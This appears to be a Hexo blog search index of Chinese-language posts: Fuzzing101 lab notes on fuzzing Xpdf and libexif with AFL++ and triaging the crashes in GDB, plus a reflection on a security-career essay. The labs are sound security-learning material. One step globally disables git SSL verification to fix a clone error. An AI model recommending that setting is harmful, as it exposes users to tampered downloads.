title="检查"></a>检查</h3><p>编译出带调试信息的可执行文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br> <br>cd exif-exif-0_6_15-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>通过GDB跑出crash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args .<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/exif ./</span>out<span class="hljs-regexp">/default/</span>crashes/&lt;your filename&gt;<br></code></pre></td></tr></table></figure><p><strong>crash1</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111050543.png" alt="image-20230722111050543"></p><p>与Exercise1一样，报错为SIGSEGV，Segmentation fault，存在内存泄漏，根据报错信息可以看出为地址无法访问</p><p><strong>crash2</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111516258.png" alt="image-20230722111516258"></p><p>错误信息：存在内存泄漏</p><p>错误位置：..&#x2F;sysdeps&#x2F;x86_64&#x2F;multiarch&#x2F;memmove-vec-unaligned-erms.S</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>官方修复方案：</p><ul><li><a href="https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361">https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361</a></li><li><a href="https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06">https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101-Exercise1</title>
    <link href="/2023/07/09/Exercise1/"/>
    <url>/2023/07/09/Exercise1/</url>
    
    <content type="html"><![CDATA[<h2 id="Fuzzing-101"><a href="#Fuzzing-101" class="headerlink" title="Fuzzing 101"></a>Fuzzing 101</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p>实验目的：安装Xpdf，安装AFL工具并了解如何使用</p><p>创建目录并安装基本工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-built_in">cd</span> fuzzing_xpdf/<br>sudo apt install build-essential<br></code></pre></td></tr></table></figure><p>下载，解压Xpdf，并完成安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">wget https://<span class="hljs-keyword">dl</span>.xpdfreader.<span class="hljs-keyword">com</span>/old/xpdf-<span class="hljs-number">3.02</span>.tar.gz<br>tar -xvzf xpdf-<span class="hljs-number">3.02</span>.tar.gz<br><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>测试Xpdf，可以下载测试样例或者自己造一个pdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br><span class="hljs-built_in">mkdir</span> pdf_examples &amp;&amp; <span class="hljs-built_in">cd</span> pdf_examples<br>wget http://www.africau.edu/images/default/sample.pdf<br></code></pre></td></tr></table></figure><p>通过命令 <code>$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code>  可以得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230708231306619.png" alt="image-20230708231306619"></p><p><code>$HOME/fuzzing_xpdf/install/bin/pdfinfo</code> 指定的要执行的程序路径，<code>-box -meta</code> 是向pdfinfo程序传递的选项和参数，-box 表示显示文档的页面框线，-meta显示文档的元数据信息</p><p><code>$HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code> 指定的是要操作的pdf文件</p><p><img src="/2023/07/09/Exercise1/image-20230708231459280.png" alt="image-20230708231459280"></p><p>在pdfinfo的目录下还有如下程序：</p><ul><li>pdffonts：用于显示 PDF 文件中使用的字体信息，包括字体名称、类型、嵌入状态等</li><li>pdfimages：用于从 PDF 文件中提取图像。它可以将 PDF 文件中的图像提取为独立的图像文件</li><li>pdftops：用于将 PDF 文件转换为 PostScript 格式。PostScript 是一种页面描述语言，可以在打印机或其他设备上进行渲染和打印</li><li>pdftotext：用于将 PDF 文件中的文本提取为纯文本格式</li></ul><p>接下来安装AFL++</p><p>第一条安装命令用于安装构建软件包（<code>build-essential</code>）、Python 3 开发库（<code>python3-dev</code>）、自动构建工具（<code>automake</code>）、版本控制工具 Git（<code>git</code>）、词法分析器生成器 Flex（<code>flex</code>）、语法分析器生成器 Bison（<code>bison</code>）、GLib 开发库（<code>libglib2.0-dev</code>）、像素管理库 Pixman 开发库（<code>libpixman-1-dev</code>）以及 Python 3 的 setuptools。</p><p>第二条安装命令用于安装 LLVM 和 Clang </p><p>第三条安装命令根据系统上已安装的 GCC 版本，安装相应的插件开发包和 libstdc++ 开发库</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></td></tr></table></figure><p>接着安装AFL++工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br>make distrib<br>sudo make install<br></code></pre></td></tr></table></figure><p>此处遇到一个报错：</p><p><img src="/2023/07/09/Exercise1/image-20230709105123404.png" alt="image-20230709105123404"></p><p>可以通过禁用SSL证书解决，但会降低安全性，需要在可靠的网络环境中操作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install gnutls-bin<br>git<span class="hljs-built_in"> config </span>--global http.sslVerify <span class="hljs-literal">false</span><br>git<span class="hljs-built_in"> config </span>--global http.postBuffer 1048576000<br></code></pre></td></tr></table></figure><p>至此AFL安装完成，可以输入 <code>afl-fuzz</code>得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230709151638679.png" alt="image-20230709151638679"></p><p>通过命令，可以对pdftotext进行测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></table></figure><p>该命令使用 AFL 工具对 pdftotext 程序进行模糊测试。它从指定的输入文件夹中获取测试样本，将 AFL 输出结果保存到out中。使用随机数种子 123，测试 pdftotext 程序，并将程序的输出结果保存到output中</p><p>等待程序运行可以得到如下结果，红色的为发现的崩溃</p><p><img src="/2023/07/09/Exercise1/image-20230709215359532.png" alt="image-20230709215359532"></p><p>运行命令，<code>-g</code> 选项用于在编译过程中生成调试符号信息，而 <code>-O0</code> 选项则指示编译器禁用优化。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">make clean<br><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> ./configure --prefix<span class="hljs-operator">=</span><span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>运行gdb，此处的your filename应该填写crashes文件夹中的，包含报错信息的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>out<span class="hljs-regexp">/default/</span>crashes<span class="hljs-regexp">/&lt;your filename&gt; $HOME/</span>fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><p>输入run或者r来运行，可以得到错误信息，程序收到了SIGSEGV信号，也称为分段错误（Segmentation fault）。这种错误通常是由于访问无效的内存地址导致的。</p><p><img src="/2023/07/09/Exercise1/image-20230716150720853.png" alt="image-20230716150720853"></p><p>通过bt命令进行回溯，可以看到反复进行了getobj和makestream的调用</p><p><img src="/2023/07/09/Exercise1/image-20230716153423406.png" alt="image-20230716153423406"></p><p>下载官方修复了该问题的Xpdf4.02发现，与此版本相比，添加了一个记录循环次数的变量，解决该问题</p><p>旧：</p><p><img src="/2023/07/09/Exercise1/image-20230716153759316.png" alt="image-20230716153759316"></p><p>新：</p><p><img src="/2023/07/09/Exercise1/image-20230716154017601.png" alt="image-20230716154017601"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>此次实验了解了模糊测试器功能，通过种子的变异和组合不断对pdftotext这个程序进行测试。同时也熟悉了gdb的相关操作以及提升了一定的程序流分析能力。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读后感：So you want to work in security?</title>
    <link href="/2023/07/07/ReflectionPeper/"/>
    <url>/2023/07/07/ReflectionPeper/</url>
    
    <content type="html"><![CDATA[<h2 id="读后感：So-you-want-to-work-in-security"><a href="#读后感：So-you-want-to-work-in-security" class="headerlink" title="读后感：So you want to work in security?"></a>读后感：So you want to work in security?</h2><p><a href="http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html">So you want to work in security?</a></p><h3 id="得忙起来"><a href="#得忙起来" class="headerlink" title="得忙起来"></a>得忙起来</h3><p>对于这篇博客，我更愿意将其视作一个纠正我暑期，或是说毕业之后的一个较为松懈的学习态度以及开学前以何种学习方式去补充自己的不足的一篇文章。</p><p>显然，本科毕业确实给我带来了一些可能与我并不相称的快乐，即其实我算是选择大于努力的那一部分人，在考研过程中我并未付出和其他人那般的努力，所以其实更应该看到自己与别人的差距，让我快要生锈的脑子转起来。</p><h3 id="任重道远"><a href="#任重道远" class="headerlink" title="任重道远"></a>任重道远</h3><p>安全方向所涉及的知识面的广度，在我浅薄的认知里，我认为是大于其他方向的。这一点其实早期在蓝鲸短暂学习的时候就感受过了。而其实这也是我在文中感觉被狠狠打脸的一部分。“<strong>Don’t give up when you encounter things you don’t understand</strong>”文中如是说，其实原来我很有幸的扛过了蓝鲸筛选的第一阶段，但随着难度上升，我逃避了。很戏谑的，某学长就在交流中问过：“这回学不学的下去”。我认为这一点确实也是我需要去克服的。</p><p>同时，文中写到要充分利用资源，对于这一点，我认为应该是充分的利用有效资源，或者说是如何高效的利用资源处理亟待解决的问题。其实无论从本科的学习还是说之前的毕设或者是论文分享，都可以看出，查找学习知识是一个类似于剥洋葱的过程，查找A中发现有B不懂，那么再去找B，学习B是发现其中出现的C，D不清楚，那么就应该先去把C，D看懂，再一层层往上反着推，无疑这会消耗大量时间，但总归是要比一知半解的了解A是什么会来的更有收获。</p><h3 id="保持思考"><a href="#保持思考" class="headerlink" title="保持思考"></a>保持思考</h3><p>这一点不仅是说是，如何去提出问题，也是面对一个问题时你能怎么去解决。安全方面，解决问题需要灵活性，可能本科期间，多数时间我们都在跟着课本学习所谓的标准答案，也就是文中提到的“If you prefer to follow a pre-set curriculum, you’re not going to get very far in security”跟着预定的课程走。我确实不否认我更乐意去按着安排做事儿，答案跟着标准答案走，但我觉着确实也应该做出一些突破了。</p>]]></content>
    
    
    <categories>
      
      <category>Something interesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>read</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
